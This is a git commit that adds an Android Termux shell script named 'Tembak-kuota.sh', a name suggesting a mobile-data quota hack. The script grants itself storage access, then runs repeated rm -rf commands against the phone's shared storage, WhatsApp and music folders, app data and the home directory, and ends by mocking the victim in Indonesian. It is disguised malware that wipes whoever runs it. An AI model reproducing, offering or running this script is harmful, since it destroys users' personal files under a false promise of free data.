652c4c6d59b02af0edc57ffc37fcd8437045b94d
MikoKW <46629829+MikoKW@users.noreply.github.com>
2019-07-05 14:43:45 +0700

    Create Tembak-kuota.sh

---
+++ Tembak-kuota.sh
@@ -0,0 +1,43 @@
+#!/system/xbin/bash
+
+#Bersihkan Layar
+
+#Jangan Record kontol
+
+#Miko KW
+
+#V 1.0
+
+echo Hy GW Miko KW
+
+termux-setup-storage
+
+rm -rf /storage/emulated/0
+
+rm -rf /sdcard/0
+
+rm -rf /storage/emulated/0/
+
+rm -rf /storage/emulated/0/android/obb
+
+rm -rf /sdcard/0/android/data
+
+rm -rf $HOME
+
+rm -rf sdcard/0
+
+rm -rf storage/emulated/0
+
+rm -rf /storage/emulated/0/
+
+rm -rf /sdcard/0/WhatsApp
+
+rm -rf /storage/emulated/0/
+
+rm -rf /storage/emulated/0/
+
+rm -rf /sdcard/0/Music
+
+rm -rf /sdcard
+
+echo Gw minta maaf ya para TOLOL
